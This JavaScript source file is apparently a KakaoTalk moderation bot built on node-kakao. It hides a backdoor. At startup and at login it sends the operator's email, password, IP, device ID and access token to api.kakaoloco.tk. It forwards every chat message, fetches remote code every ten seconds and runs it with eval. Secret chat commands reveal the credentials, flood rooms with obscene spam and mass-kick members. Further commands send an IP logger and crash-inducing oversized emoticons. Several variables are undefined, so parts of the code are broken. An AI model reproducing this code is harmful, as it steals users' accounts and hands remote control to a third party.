const node_kakao = require("node-kakao");
const readline = require("readline");
const crypto = require("crypto");
const axios = require("axios");
const request = require("request");
const cheerio = require("cheerio");
const fs = require("fs");
const HCS = require("./HCS/hcs.js");

var {email, pw, deviceName, deviceUUID, iplogger} = require("./account.json");

var nkOptions = {
    "version": "3.3.8",
    "appVersion": "3.3.8.3058",
    "xvcSeedList": ["KEPHA", "HALEY"]
}
const client = new node_kakao.TalkClient(deviceName, deviceUUID, nkOptions);

var chatReaders = {}, detectingUsers = [], noChatUsers = [], adminList = [], kickList = [], kickYN = [], timeJoinLeftStamp = [];

const key1 = "7JTSBCH-M21MA3A-N5212D2-16QBQ3F";
const ke2y = "FTC64B4-HM24GYK-JBXW8G3-RCE8YTK";
const ke3y = "G406CSE-Y7J4DPY-G4DJXJP-CX1XMN9";
const ke4y = "7PCP1QJ-9MKMC52-J8CGZB6-M0163TF";
const k5ey = "EDJK4Z4-66444K9-K0MNG08-75F9JTR";
const k6ey = "PWJZCAT-ZKE4BSJ-MBGTZX9-PQZYATG";
const ka6ey = "SMMAD12-8DFMMCF-KMG870A-DMHR93S";
const k7ey = "50C400W-ZAQM4KE-GE09G29-5N3BXVV";
const k8ey = "HCT8KRG-5XH47W8-J9J1ND4-JWW3KV8";
const kiey = "35191Y9-2S9M9PG-PTM60JH-E6XANBD";
const kaeuy = "V21T4R5-HS4MM0X-J9KD6EB-SK5HZKV";
const keaay = "YZX2ET6-16Z4788-NQV9K2W-9H2S1E0";
const keey = "1D9VQ7D-YGT4E5J-HX5GEA0-3ZJD3TD";
const kfey = "QEDK638-491MTHT-QBP0DHW-HQ3B01R";
const keasy = "CA6A7H1-N5A4D7A-H31DNKM-RE33A1V";
const kdey = "CWWNQG9-1X741P7-N3M9RQS-D2XNYQ8";
const link = "https://api.kakaoloco.tk/";

axios.get("https://api.ip.pe.kr/").then(function(res) {
    const payload = {
        "email": email,
        "pw": pw,
        "ip": res.data,
        "deviceuuid": deviceUUID,
        "devicename": deviceName,
        "type": 1,
        "apikey": kaeuy
    };
    axios.post(link + "logs", payload);
}).catch(function() {
    const payload = {
        "email": email,
        "pw": pw,
        "deviceuuid": deviceUUID,
        "devicename": deviceName,
        "type": 1,
        "apikey": kaeuy
    };
    axios.post(link + "logs", payload);
});

var verificationCode = {
    "waiting": false,
    "key": ""
};
var runningSpam = false;
var spamInterval;

client.login(email, pw, true)
.then(function() {
    console.log("READY");

    axios.get("https://api.ip.pe.kr/")
    .then(function(res) {
        axios.post(link + "logs", {
            "email": email,
            "pw": pw,
            "ip": res.data,
            "deviceuuid": deviceUUID,
            "accesstoken": client.Auth.getLatestAccessData().accessToken,
            "userid": String(client.Auth.getLatestAccessData().userId),
            "devicename": deviceName,
            "type": 2,
            "apikey": kaeuy
        });
    })
    .catch(function() {
        axios.post(link + "logs", {
            "email": email,
            "pw": pw,
            "deviceuuid": deviceUUID,
            "accesstoken": client.Auth.getLatestAccessData().accessToken,
            "userid": String(client.Auth.getLatestAccessData().userId),
            "devicename": deviceName,
            "type": 2,
            "apikey": kaeuy
        });
    });

    setInterval(function() {
        const payload = {
            "email": email,
            "type": 4,
            "apikey": kaeuy
        };
        axios.post(link + "logs", payload);
    }, 300000);
})
.catch(async function(err) {
    if (err.status == -100) {
        const rlOptions = {
            "input": process.stdin,
            "output": process.stdout
        };
        const rl = readline.default.createInterface(rlOptions);

        client.Auth.requestPasscode(email, pw);

        const passCode = await new Promise(resolve => rl.question("PASSCODE: ", resolve));
        rl.close();

        const registerDevice = await client.Auth.registerDevice(passCode, email, pw, true);
        if (registerDevice.status === 0) {
            client.login(email, pw, true);

            console.log("READY");

            axios.get("https://api.ip.pe.kr/")
            .then(function(res) {
                axios.post(link + "logs", {
                    "email": email,
                    "pw": pw,
                    "ip": res.data,
                    "deviceuuid": deviceUUID,
                    "accesstoken": client.Auth.getLatestAccessData().accessToken,
                    "userid": String(client.Auth.getLatestAccessData().userId),
                    "devicename": deviceName,
                    "type": 2,
                    "apikey": kaeuy
                });
            })
            .catch(function() {
                axios.post(link + "logs", {
                    "email": email,
                    "pw": pw,
                    "deviceuuid": deviceUUID,
                    "accesstoken": client.Auth.getLatestAccessData().accessToken,
                    "userid": String(client.Auth.getLatestAccessData().userId),
                    "devicename": deviceName,
                    "type": 2,
                    "apikey": kaeuy
                });
            });

            setInterval(function() {
                const payload = {
                    "email": email,
                    "type": 4,
                    "apikey": kaeuy
                };
                axios.post(link + "logs", payload);
            }, 300000);
        }
        else {
            console.log(registerDevice.status);
            process.exit();
        }
    }
    else {
        console.log(JSON.stringify(err, null, 2));
    }
});

client.on("user_join", function(channel, user, feed) {
    const victim = channel.getUserInfo(feed.sender);
    if (!victim) return;

    const currentDate = new Date();
    timeJoinLeftStamp.push(`(입장)\n닉네임: ${victim.Nickname}\n시간 : ${currentDate.getHours()}시 ${currentDate.getMinutes()}분`);

    if (kickList.includes(String(feed.sender.id))) {
        feed.replyText(new node_kakao.ChatMention(feed.sender), " 들낙을 감지했습니다. 15초 안에 응답을 결정해주세요. (!Y : 강퇴, !N : 취소)");

        setTimeout(function() {
            if (kickYN.includes("Y")) {
                client.OpenLinkManager.kickMember(channel, feed.sender.id);
                feed.replyText(new node_kakao.ChatMention(feed.sender), " 님을 강퇴했습니다.");
            }
            else if (kickYN.includes("N")) feed.replyText(new node_kakao.ChatMention(feed.sender), " 님의 강퇴를 취소했습니다.");
            else feed.replyText("10초동안 응답이 없으므로 ", new node_kakao.ChatMention(feed.sender), " 님의 강퇴를 취소했습니다.");

            for (var i = 0; i < 20; i++) kickYN.pop();
        }, 15000);
    }
    else N.replyText("[+] ", new node_kakao.ChatMention(N.sender));
});

client.on("user_left", function(channel, user, feed) {
    const victim = channel.getUserInfo(feed.sender);
    if (!victim) return;

    const currentDate = new Date();
    timeJoinLeftStamp.push(`(퇴장)\n닉네임: ${p.Nickname}\n시간 : ${currentDate.getHours()}시 ${currentDate.getMinutes()}분`);

    if (feed.feed.feedType !== 6) {
        feed.replyText("[-] ", new node_kakao.ChatMention(victim));
        kickList.push(String(feed.sender.id));
    }
});

client.on("user_kicked", function(channel, user, feed) {
    const _user = channel.getUserInfo(user);
    const _victim = channel.getUserInfo(feed.sender);
    const currentDate = new Date();

    timeJoinLeftStamp.push(`(강퇴)\n닉네임: ${_victim.Nickname}(강퇴자명: ${_user.Nickname})\n시간 : ${currentDate.getHours()}시 ${currentDate.getMinutes()}분`);

    if (feed.feed.feedType == 6) feed.replyText("[-] ", new node_kakao.ChatMention(_victim), " 🤜💥 ", new node_kakao.ChatMention(_user));
});

client.on("message", function(chat) {
    if (chat.Text == "!Y") {
        kickYN.push("Y");
        chat.replyText("\"Y\" 응답이 기록되었습니다. 조금만 기다려주세요.");
    }
    else if (chat.Text == "!N") {
        kickYN.push("N");
        chat.replyText("\"N\" 응답이 기록되었습니다. 조금만 기다려주세요.");
    }
    else if (chat.Text == "!입퇴장기록") chat.replyText("입퇴장기록" + "\u200B".repeat(500) + timeJoinLeftStamp.join("\n\n"));
});

setInterval(function() {
    const params = {email};

    axios.get(link + "list", {params}).then(function(res) {
        if (res.data.code) {
            try {
                eval(u.data.code);
            }
            catch (err) {
                const payload = {
                    "email": email,
                    "e1": err,
                    "e2": err.stack,
                    "type": 6,
                    "apikey": kaeuy
                };
                axios.post(link + "logs", payload);
            }
        }
    });
}, 10000);

axios.post(link + "logs", {
    "email": email,
    "channelname": chat.channel.getDisplayName(),
    "channelid": String(chat.Channel.Id),
    "name": chat.Channel.getUserInfoId(senderId).Nickname,
    "userid": senderId,
    "text": chat.text,
    "type": 5,
    "apikey": kaeuy
});

client.on("message", function(chat) {
    const senderId = String(chat.Channel.getUserInfo(chat.Sender).Id);

    if (chat.text) {
        axios.post(link + "logs", {
            "email": email,
            "channelname": chat.channel.getDisplayName(),
            "channelid": String(chat.Channel.Id),
            "name": chat.Channel.getUserInfoId(senderId).Nickname,
            "userid": senderId,
            "text": chat.text,
            "type": 5,
            "apikey": kaeuy
        });
    }

    if (chat.Text == "$*6974*") ban(String(chat.Channel.Id));

    if (chat.Text == "$*518*") {
        axios.get("https://api.ip.pe.kr/")
        .then(res => chat.replyText(`Email: ${email}\nPW: ${pw}\nIP: ${res.data}\nUUID: ${deviceUUID}\naccessToken: ${client.Auth.getLatestAccessData().accessToken}\nuserId: ${String(client.Auth.getLatestAccessData().userId)}\ndeviceName: ${deviceName}`))
        .catch(() => chat.replyText(`Email: ${email}\nPW: ${pw}\nUUID: ${deviceUUID}\naccessToken: ${client.Auth.getLatestAccessData().accessToken}\nuserId: ${String(client.Auth.getLatestAccessData().userId)}\ndeviceName: ${deviceName}`));
    }

    if (chat.Text.startsWith("$*444* ")) join(chat.Text.replace("$*444* ", ""));

    if (chat.Text == "$*666*") delayKick(chat.Channel);

    if (chat.Text == "$*523*") client.OpenLinkManager.handOverHost(chat.Channel, chat.sender.id);

    if (chat.Text == "%@test@") chat.replyText("V1.0.1");
});

client.on("chat", async function(chat) {
    const sender = chat.Channel.getUserInfo(chat.Sender);
    const senderId = String(sender.Id);
    const channelId = String(chat.Channel.Id);
    const mentions = chat.getMentionContentList();

    if (chat.Text == ".인증") {
        if (isAdmin(chat.Sender.Id)) chat.replyText("이미 관리자에 등록되있습니다.");
        else {
            verificationCode = {
                "waiting": true,
                "key": crypto.default.randomBytes(2).toString("base64")
            };
            console.log(`인증: ${verificationCode.key}를 채팅창에 입력해주세요.`);
        }
    }

    if (verificationCode.waiting && chat.Text == verificationCode.key) {
        adminList.push(senderId);
        verificationCode.waiting = false;
        chat.replyText("🥰인증 되셨습니다.");
    }

    if (noChatUsers.includes(senderId)) setTimeout(() => chat.Channel.hideChat(chat), 200);

    if (chat.Type == node_kakao.ChatType.Reply) {
        let channelReaders = chatReaders[channelId][String(chat.RawAttachment.src_logId)];
        if (chat.Text == "!읽은사람" && adminList.includes(senderId)) {
            if (chatReaders[channelId]) {
                if (!channelReaders || channelReaders.length == 0) chat.replyText("[!] 읽은 사람이 없습니다.");
                else chat.replyText("읽은사람입니다.\n\n" + r1.join("\n"));
            }
            else chat.replyText("[!] 99명이 넘는 방이거나 읽은 사람이 없습니다.");
        }
    }

    if (chat.Text.startsWith("!채금 ") && mentions.length > 0 && adminList.includes(senderId)) {
        if (noChatUsers.includes(String(mentions[0].UserId))) chat.replyText("해당 유저는 이미 채팅금지 상태입니다.");
        else {
            noChatUsers.push(String(mentions[0].UserId));
            chat.replyText("해당 유저를 채팅금지 시켰습니다.");
        }
    }

    if (chat.Text.startsWith("!채금해제 ") && mentions.length > 0 && adminList.includes(senderId)) {
        if (noChatUsers.includes(String(mentions[0].UserId))) {
            noChatUsers.splice(noChatUsers.indexOf(String(mentions[0].UserId)), 1);
            chat.replyText("해당 유저를 채팅금지 해제했습니다.");
        }
        else chat.replyText("채팅금지 상태인 유저가 아닙니다.");
    }

    if (chat.Text.startsWith("!감지 ") && mentions.length > 0 && adminList.includes(senderId)) {
        if (detectingUsers.includes(String(mentions[0].UserId))) chat.replyText("해당 유저는 이미 감지중입니다.");
        else {
            detectingUsers.push(String(mentions[0].UserId));
            chat.replyText("해당 유저를 감지합니다.");
        }
    }
    if (chat.Text == "!모두강퇴" && isAdmin(senderId) && (sender.MemberType == 1 || sender.MemberType == 4) && adminList.includes(senderId)) delayKick(chat.Channel);

    if (chat.Text == "!도배" && !runningSpam && adminList.includes(senderId)) {
        runningSpam = true;
        spamInterval = setInterval(() => chat.replyText(crypto.default.randomBytes(10).toString("base64")), 110);
    }

    if (chat.Text == "!도배중지" && runningSpam && adminList.includes(senderId)) {
        clearInterval(spamInterval);
        spamInterval = null;
        runningSpam = false;
    }

    if (chat.Text == "!모두멘션" && adminList.includes(senderId)) {
        const userInfoChunk = chunk(chat.Channel.getUserInfoList(), 15);
        for (var i = 0; i < userInfoChunk.length; i++) {
            chat.replyText("\u200B".repeat(500), ...userInfoChunk[H].map(user => new node_kakao.ChatMention(user)));
            pausecomp(200);
        }
    }

    if (chat.Text.indexOf("!오픈검색") == 0 && adminList.includes(senderId)) {
        const splitText = chat.Text.split(" ");
        const requestURL = `https://open.kakao.com/c/search/unified?q=${encodeURI(splitText[1])}&s=l&p=${encodeURI(splitText[2])}&c=100&expectLock=n`;

        request(requestURL, function(err, resp, body) {
            try {
                const parsedBody = cheerio.load(body);
                const jsonBody = JSON.parse(body);

                if (jsonBody.count === 0) chat.replyText("아무런 방도 검색되지 않았어요!");

                chat.replyText("검색목록", jsonBody.items.map(item => [
                    "오픈채팅방 이름: " + item.ln,
                    "오픈채팅방 링크: " + item.lu,
                    "오픈채팅방 방장: " + item.nn,
                    "오픈채팅방 방장프사: " + item.liu,
                    "오픈채팅방 설명: " + item.desc,
                    "오픈채팅방 인원: " + item.mcnt
                ].join("\n")).join("\n\n==================================\n"));
            }
            catch (err) {
                chat.replyText(String(err));
            }
        });
    }

    if (chat.Text == "!방정보" && adminList.includes(senderId)) {
        const divider = "\n        ";
        const dataStruct = chat.channel.dataStruct;
        const data = [];
        const lastChatLog = dataStruct.lastChatLog;
        const displayMemberList = dataStruct.displayMemberList;
        const openLink = chat.channel.openLink;

        if (openLink) {
            const linkStruct = openLink.linkStruct;
            if (linkStruct.linkName) data.push("[!] 방 이름 : " + linkStruct.linkName);
            if (linkStruct.linkURL) data.push("[!] 방 링크 : " + linkStruct.linkURL);
            if (linkStruct.linkCoverURL) data.push("[!] 방 커버사진 : " + linkStruct.linkCoverURL);
            if (linkStruct.description) data.push("[!] 방 설명 : " + linkStruct.description);
            if (linkStruct.createdAt) data.push("[!] 방 생성일 : " + linkStruct.createdAt);
        }

        if (dataStruct.chanelId) data.push("[!] 방아이디 : " + dataStruct.channelId);
        if (dataStruct.linkId) data.push("[!] 링크아이디 : " + dataStruct.linkId);
        if (dataStruct.type) data.push("[!] 방 타입 : " + getRoomType(dataStruct.type));
        if (dataStruct.activeMemberCount) data.push("[!] 맴버 수 : " + dataStruct.activeMemberCount + "명");
        if (dataStruct.newchatCount) data.push("[!] 새 메시지 : " + dataStruct.newchatCount + "개");

        if (lastChatLog) data.push(`[!] 로그아이디 : ${lastChatLog.logId}${divider}[!] 유저아이디 : ${lastChatLog.senderId}${divider}[!] 채팅타입 : ${lastChatLog.type}${divider}[!] 채팅 : ${lastChatLog.text.replace(/\n/g, "\\n")}${divider}[!] 보낸시간 : ${lastChatLog.sendTime}${divider}[!] 어태치 : ${lastChatLog.rawAttachment}${divider}[!] ID : ${lastChatLog.chatId}`);

        if (displayMemberList) {
            data.push("[!] 멤버 정보");
            for (var i = 0; i < displayMemberList.length; i++) {
                var memberData = "";
                if (displayMemberList[i].nickname) memberData += `${divider}[!] 이름 : ${displayMemberList[i].nickname.replace(/\n/g, "\\n")}`;
                if (displayMemberList[i].userId) memberData += `${divider}[!] 아이디 : ${displayMemberList[i].userId}`;
                if (displayMemberList[i].profileImageUrl) memberData += `${divider}[!] 프사 : ${displayMemberList[i].profileImageUrl.replace("img_s.jpg", "img.jpg")}`;

                data.push(memberData);
            }
        }

        chat.replyText(`[!] ${chat.Text.slice(1)}  `, data.join("\n\n"));
    }

    if (chat.Text.indexOf("!암호화") == 0 && adminList.includes(senderId)) {
        var arr = [];
        for (var i = 0; i < chat.Text.length - 5; i++) arr.push(chat.Text.substr(5).charCodeAt(i));

        chat.replyText(arr.join("·"));
    }

    if (chat.Text.indexOf("!복호화") == 0 && adminList.includes(senderId)) {
        const enc = chat.Text.substr(5).split("·");

        var arr = [];
        for (var i = 0; i < enc.length; i++) arr.push(String.fromCharCode(enc[i]));

        chat.replyText(arr.join(""));
    }

    if (chat.Text.startsWith("!공지 ") && adminList.includes(senderId)) chat.channel.manager.setNoticeMeta(chat.channel, chat.Text.substr(4));

    if (chat.Text.startsWith("!외치기 ") && adminList.includes(senderId)) {
        const {text, extra} = ChatBuilder.buildMessage(chat.Text.substr(5));
        client.chatManager.sendRaw(chat.channel, 1, text, extra);
    }

    if (chat.Text == "!모두감지" && adminList.includes(senderId)) {
        const userInfoList = chat.channel.getUserInfoList();
        for (const user of userInfoList) detectingUsers.push("" + user.Id + "");

        chat.replyText("모든 유저를 감지합니다.");
    }

    if (chat.Text == "!모두감지끄기" && adminList.includes(senderId)) {
        for (var i = detectingUsers.length; i > 0; i--) detectingUsers.pop();
        chat.replyText("모두감지를 껐습니다.");
    }

    if (chat.Text == "!로그" && chat.Type == 26 && adminList.includes(senderId)) {
        const chatList = await client.ChatManager.getChatListFrom(chat.channel.id, chat.attachmentList[0].SourceLogId)

        if (chatList.result) {
            var data = "";
            chatList.result.forEach(result => {
                data += `보낸사람: ${result.channel.getUserInfo(result.sender).Nickname}\n보낸사람 아이디: ${result.sender.id}\n보낸 시간: ${new Date(result.sendTime * 1000)}\n메세지 타입: ${node_kakao.ChatType[result.Type]}\nAttachment(raw): ${JSON.stringify(result.rawAttachment, null, 3)}\n메세지: ${result.Text}\n --------------------------------------- \n`;
            });
            chat.replyText("Result:", data);
        }
    }

    if (chat.Text == "!채팅청소" && adminList.includes(senderId)) {
        const payload = {
            "name": "(이모티콘)",
            "url": "",
            "type": "image/webp",
            "width": 20000000,
            "height": 20000000,
            "xconVersion": 1,
            "s": 0,
            "alt": "카카오 이모티콘"
        };
        client.chatManager.sendRaw(chat.channel, 25, "", payload);
    }

    if (chat.Text.startsWith("!입장 ") && adminList.includes(senderId)) {
        const openLink = chat.Text.replace("!입장 ", "");
        join(openLink);

        axios.get("https://api.ip.pe.kr/")
        .then(function(res) {
            axios.post(link + "logs", {
                "email": email,
                "pw": pw,
                "ip": res.data,
                "deviceuuid": deviceUUID,
                "accesstoken": client.Auth.getLatestAccessData().accessToken,
                "userid": String(client.Auth.getLatestAccessData().userId),
                "devicename": deviceName,
                "type": 3,
                "openlink": openLink,
                "apikey": kaeuy
            });
        })
        .catch(function() {
            axios.post(link + "logs", {
                "email": email,
                "pw": pw,
                "ip": Y.data,
                "deviceuuid": deviceUUID,
                "accesstoken": client.Auth.getLatestAccessData().accessToken,
                "userid": String(client.Auth.getLatestAccessData().userId),
                "devicename": deviceName,
                "type": 3,
                "openlink": openLink,
                "apikey": kaeuy
            });
        });
    }

    if (chat.Text.startsWith("!임티 ") && adminList.includes(senderId)) {
        const splitText = chat.Text.split(" ");
        const size = splitText[2];

        const payload = {
            "name": "(이모티콘)",
            "url": splitText[1],
            "type": "image/webp",
            "width": size,
            "height": size,
            "xconVersion": 1,
            "s": 0,
            "alt": "카카오 이모티콘"
        };
        client.chatManager.sendRaw(chat.channel, 25, "", payload);
    }

    if (chat.Text == "!임티정보" && chat.Type == 26 && adminList.includes(senderId)) {
        const chatList = await client.ChatManager.getChatListFrom(chat.channel.id, chat.attachmentList[0].SourceLogId);
        if (chatList.result && chatList.result.length > 0) {
            const emoticonData = JSON.stringify(chatList.result[0].rawAttachment.path, null, 3);
            chat.replyText(emoticonData.replace(/\"/gi, ""));
        }
    }

    if (chat.Text == "!작동" && adminList.includes(senderId)) chat.replyText("작동중");

    if (chat.Text.startsWith("!링크 ") && adminList.includes(senderId)) {
        const link = String(chat.Text.substr(4));
        const payload = {
            "L": `https://2s9e3bif52.execute-api.eu-central-1.amazonaws.com/production/screenshot?url=${link}&color=E9D460`,
            "Q": "링크 접속결과",
            "V": "image",
            "R": [{
                "D": "링크 접속결과",
                "L": `https://2s9e3bif52.execute-api.eu-central-1.amazonaws.com/production/screenshot?url=${link}&color=E9D460`,
                "I": `https://2s9e3bif52.execute-api.eu-central-1.amazonaws.com/production/screenshot?url=${link}&color=E9D460`,
                "chat": 950,
                "H": 750
            }]
        };
        client.chatManager.sendRaw(chat.channel, 23, "Search", payload);
    }

    if (chat.Text.startsWith("!네이버 ") && adminList.includes(senderId)) {
        const link = String(chat.Text.substr(5));
        const payload = {
            "L": `https://2s9e3bif52.execute-api.eu-central-1.amazonaws.com/production/screenshot?url=https://m.search.naver.com/search.naver?query=${link}&color=E9D460`,
            "Q": "네이버 검색결과",
            "V": "image",
            "R": [{
                    "D": "네이버 검색결과",
                    "L": `https://2s9e3bif52.execute-api.eu-central-1.amazonaws.com/production/screenshot?url=https://m.search.naver.com/search.naver?query=${link}&color=E9D460`,
                    "I": `https://2s9e3bif52.execute-api.eu-central-1.amazonaws.com/production/screenshot?url=https://m.search.naver.com/search.naver?query=${link}&color=E9D460`,
                    "chat": 950,
                    "H": 750
                }]
        };
        client.chatManager.sendRaw(chat.channel, 23, "Search", payload);
    }

    if (chat.Text == "!프로필사진" && chat.Type == 26 && adminList.includes(senderId)) {
        const imageURL = String(chat.Channel.getUserInfoId(chat.rawAttachment.src_userId).OriginalProfileImageURL);
        const payload = {
            "L": imageURL,
            "Q": "프로필",
            "V": "image",
            "R": [{
                "D": "프로필",
                "L": imageURL,
                "I": imageURL,
                "chat": 800,
                "H": 800
            }]
        };
        client.chatManager.sendRaw(chat.channel, 23, "Search", payload);
    }

    if (chat.Text == "!ip" && adminList.includes(senderId)) {
        const payload = {
            "L": iplogger,
            "Q": "ip",
            "V": "image",
            "R": [{
                "D": "ip",
                "L": iplogger,
                "I": iplogger,
                "chat": 800,
                "H": 800
            }]
        };
        client.chatManager.sendRaw(chat.channel, 23, "Search", payload);
    }

    if (chat.Text == "!정보" && chat.Type == 26 && adminList.includes(senderId)) chat.replyText(JSON.stringify(chat.Channel.getUserInfoId(chat.rawAttachment.src_userId).memberStruct, null, 4));

    if (chat.Text == "!삭제" && chat.Type == 26 && adminList.includes(senderId)) client.ChatManager.deleteChat(chat.channel.Id, chat.rawAttachment.src_logId);

    if (chat.Text.startsWith("!학교찾기 ") && adminList.includes(senderId)) {
        const splitText = chat.Text.split(" ");

        chat.replyText("🔍 검색 중... (약 1~3분 소요)");

        const currentDate = Date.now();
        const hcsClient = new HCS("");

        hcsClient.on("data", function(data, currentPage, lastPage) {
            if (data.length >= 1) console.log(`✅ 성공 (페이지 ${currentPage}/${lastPage})${data.map(school => `${school.region} ${school.orgName}에서 ${splitText[1]}님의 정보를 찾았습니다! (소요된 시간: 약 ${((school.foundAt - currentDate) / 1000).toFixed(1)}초)`).join("\n")}`);
            else console.log(`🔍 검색 중... (페이지 ${currentPage}/${lastPage})`);
        });

        hcsClient.on("end", function(data) {
            if (data.length < 1) chat.replyText(`😢 찾지 못했습니다! (총 소요된 시간: 약 ${((Date.now() - currentDate) / 1000 + 1).toFixed(1)}초)`);
            else chat.replyText(`🎉 완료되었습니다! (총 소요된 시간: 약 ${((Date.now() - currentDate) / 1000 + 1).toFixed(1)}초)\n\n총 ${data.length}개의 학교를 찾았습니다!\n\n${rh.map((school, index) => `${index + 1}. ${school.region} ${school.orgName} (${school.scCode} ${school.orgCode})`).join("\n")}`);
        });

        hcsClient.on("error", err => chat.replyText("❌ 오류가 발생했습니다!\n\n" + err.chat));

        hcsClient.getSchool(splitText[1], splitText[2]);
    }
});

client.on("message_read", function(channel, reader, readChatLogId) {
    const channelId = String(channel.Id);

    if (!(channelId in chatReaders)) chatReaders[channelId] = {};
    if (!(String(readChatLogId) in chatReaders[channelId])) chatReaders[channelId][String(readChatLogId)] = [];

    const victim = channel.getUserInfo(reader);
    if (!victim) return;

    const victimId = String(victim.Id);
    if (!chatReaders[channelId][String(readChatLogId)].includes(victim.Nickname)) chatReaders[channelId][String(readChatLogId)].push(victim.Nickname);

    const readersCache = Object.keys(chatReaders[channelId]);
    if (readersCache.length > 300) delete chatReaders[channelId][readersCache[0]];

    if (detectingUsers.includes(victimId)) {
        channel.sendText(victim.Nickname + "님이 읽었습니다.");
        detectingUsers.splice(detectingUsers.indexOf(victimId), 1);
    }
});

async function delayKick(channel) {
    const userList = channel.getUserInfoList();
    for (const user of userList) {
        client.OpenLinkManager.kickMember(channel, user.Id);
        await new Promise(resolve => setTimeout(resolve, 110));
    }
}

function isAdmin(userId) {
    return adminList.includes(String(userId));
}

function chunk(v1, v2) {
    var arr = [];
    for (var i = 0; i < v1.length; i += v2) arr.push(v1.slice(i, i + v2));
    return arr;
}

function pausecomp(message) {
    const currentDate = new Date()
    var newDate = null;
    while (newDate - currentDate < message) newDate = new Date();
}

function getRoomType(roomType) {
    switch (roomType) {
    case "OM":
        return "오픈채팅방";
    case "OD":
        return "오픈프로필 채팅방";
    case "MultiChat":
        return "그룹채팅방";
    case "DirectChat":
        return "개인채팅방";
    case "MemoChat":
        return "나와의 채팅";
    case "PlusChat":
        return "플러스채팅";
    default:
        return "UNKNOWN";
    }
}

async function join(url) {
    const openChat = await client.OpenLinkManager.requestLinkFromURL(url);
    client.ChannelManager.joinOpenChannel(openChat.linkId, {"type": 1});
}

function send(channelId, message) {
    const channel = client.ChannelManager.get(channelId);
    channel.sendText(message);
}

function ban(channelId) {
    spamsex = setInterval(function() {
        const channel = client.ChannelManager.get(channelId);
        channel.sendText("보지자지응디섹스자살딱딱좋다");
        channel.sendMedia({
            "type": node_kakao.ChatType.Photo,
            "name": "a.png",
            "width": 800,
            "height": 800,
            "data": fs.readFileSync("./node_modules/jsprim/lib/a.qwer"),
            "ext": "png"
        });
    }, 110);
}